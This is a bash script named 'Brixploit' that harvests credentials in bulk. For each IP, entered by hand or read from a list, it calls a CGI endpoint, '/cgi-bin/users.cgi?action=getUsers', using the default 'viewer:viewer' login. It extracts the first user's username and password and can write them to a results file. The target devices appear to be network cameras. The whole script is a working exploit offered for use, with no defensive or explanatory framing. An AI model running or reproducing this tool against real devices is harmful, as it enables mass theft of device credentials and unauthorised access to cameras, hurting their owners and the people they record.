#!/bin/bash
set -e

echo "______      _                _       _ _   "
echo "| ___ \    (_)              | |     (_) |  "
echo "| |_/ /_ __ ___  _____ _ __ | | ___  _| |_ "
echo "| ___ \ '__| \ \/ / __| '_ \| |/ _ \| | __|"
echo "| |_/ / |  | |>  <\__ \ |_) | | (_) | | |_ "
echo "\____/|_|  |_/_/\_\___/ .__/|_|\___/|_|\__|"
echo "                      | |                  "
echo "                      |_|                  "
echo ""
echo "Made by EMLGaming & M00SE"

function print-help {
    echo "Usage: $0 [Options]"
    echo ""
    echo "Options:"
    echo "  -h, --help                   Prints this help page."
    echo ""
    echo "  -o=<file>, --output=<file>   Saves results in a file. Disables interactive mode."
    echo "  -r=<file>, --read=<file>     Reads ip addresses from a file."
    echo ""
    echo "Examples:"
    echo "$0 -r=iplist.txt -o=results.txt"
}

function check-ip {
    set +e # prevent exiting on failed exploit
    curl -s --max-time 10 "http://$1/cgi-bin/users.cgi?action=getUsers" -u "viewer:viewer" | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)'
    set -e
}


INTERACTIVE=1

for i in "$@"
do
    case $i in
        -h|--help)
            print-help
            exit 0 # prevent non-zero code
        ;;

        -o=*|--output=*)
            OUTPUT="${i#*=}"
        ;;

        -r=*|--read=*)
            INTERACTIVE=0
            READ_FILE="${i#*=}"
        ;;

        *)
            echo "Ignoring parameter ${i}: Unknown parameter"
        ;;
    esac
done


if [ $INTERACTIVE -eq "1" ]; then
    # Interactive mode
    echo "Enter target ip (e.g. 1.2.3.4:81):"
    read ip
    if [ -z ${OUTPUT+x} ]
    then
        echo "${ip}:"
        check-ip $ip
        echo ""
    else
        echo "${ip}:" >> "$OUTPUT" 2>&1
        check-ip $ip >> "$OUTPUT" 2>&1
        echo "" >> "$OUTPUT" 2>&1
    fi
else
    # Read mode
    let x=0 || true # exit script otherwise
    lines="$(wc -l $READ_FILE | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
    while read ip; do
        let x++ || true # exit script otherwise
        echo "Working on IP $ip ($x/$lines)..."
        if [ -z ${OUTPUT+x} ]
        then
            echo "${ip}:"
            check-ip $ip
            echo ""
        else
            echo "${ip}:" >> "$OUTPUT" 2>&1
            check-ip $ip >> "$OUTPUT" 2>&1
            echo "" >> "$OUTPUT" 2>&1
        fi
    done <$READ_FILE
fi
